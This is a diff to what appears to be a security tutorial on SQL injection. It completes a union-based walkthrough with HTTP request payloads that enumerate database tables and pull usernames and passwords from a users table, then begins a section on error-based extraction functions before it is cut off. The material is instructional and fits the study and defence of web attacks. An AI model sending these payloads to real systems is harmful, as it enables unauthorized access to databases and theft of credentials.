@@ -121,4 +121,23 @@ Let's walk through a complete example of exploiting a union-based SQL injection:
    ```http
    GET /products?id=999 UNION SELECT 111,'aaa',222-- HTTP/1.1
    ```
-   999 ensures
+   999 ensures original query returns no results so we only see our injected data.
+
+4. **Extract data**:
+    Now replace the placeholders with real queries:
+    ```http
+    GET /products?id=999 UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- HTTP/1.1
+    ```
+
+5. **Get sensitive data**:
+    Once you know table and column names: 
+    ```http
+    GET /products?id=999 UNION SELECT NULL,username,password FROM users-- HTTP/1.1
+    ```
+
+## Error-Based SQL Injection Advanced Techniques
+
+Attackers often use these functions for error-based extraction:
+
+- `CONVERT()` or `CAST()` to force type conversion errors
+- `EXEC()`
